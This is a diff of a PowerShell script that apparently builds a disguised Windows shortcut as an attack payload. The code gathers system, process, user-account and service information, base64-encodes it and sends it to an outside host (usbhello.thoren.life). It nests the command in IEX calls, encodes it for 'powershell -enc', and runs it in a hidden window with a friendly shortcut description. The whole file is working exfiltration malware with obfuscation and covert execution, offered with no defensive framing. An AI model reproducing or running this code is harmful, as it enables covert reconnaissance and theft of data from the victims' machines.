@@ -1,14 +1,17 @@
-# Get client information
-$ComputerInfo = Get-ComputerInfo | Out-String
-$tasks = tasklist | Out-String
-$users = net user | Out-String
-$services = Get-Service | Out-String
-$data = $ComputerInfo + "`n | `n" + $tasks + "`n | `n" + $users + "`n | `n" + $services
 
-# Encode data to base64
-$EncodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
+# $payload = "IEX ((New-Object Net.WebClient).UploadString('http://usbhello.thoren.life:41295/', 'POST', $EncodedData))"
 
-$payload = "IEX ((New-Object Net.WebClient).UploadString('http://usbhello.thoren.life:41295/', 'POST', $EncodedData))"
+
+# $payload = 'iex ("iex ($data = iex(`'Get-ComputerInfo | Out-String; tasklist | Out-String; net user | Out-String; Get-Service | Out-String`'); $EncodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data));(New-Object Net.WebClient).UploadString("http://usbhello.thoren.life:41295/", "POST", $EncodedData)")'
+
+# $test = 'echo "Hello World!";echo ``'asd``';echo "lol"'
+
+# $enumCommands = 'Get-ComputerInfo | Out-String; tasklist | Out-String; net user | Out-String; Get-Service | Out-String'
+
+# $payload = 'iex (`'iex ($data = iex(`"Get-ComputerInfo | Out-String; tasklist | Out-String; net user | Out-String; Get-Service | Out-String`"); $EncodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data));(New-Object Net.WebClient).UploadString("http://usbhello.thoren.life:41295/", "POST", $EncodedData)`')'
+
+$payload = 'iex (`"iex ($data = iex("Get-ComputerInfo | Out-String; tasklist | Out-String; net user | Out-String; Get-Service | Out-String"); $EncodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data));(New-Object Net.WebClient).UploadString(`"http://usbhello.thoren.life:41295/`", `"POST`", $EncodedData)`")'
+
 
 # Encode payload to base64
 $ENCODED = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
@@ -30,3 +33,7 @@ $shortcut.Description = "Hello there, nice to see you"
 $shortcut.WindowStyle = 7
 
 $shortcut.Save()
+
+
+powershell.exe -nop -w hidden -enc $ENCODED
+powershell.exe -nop -enc $ENCODED
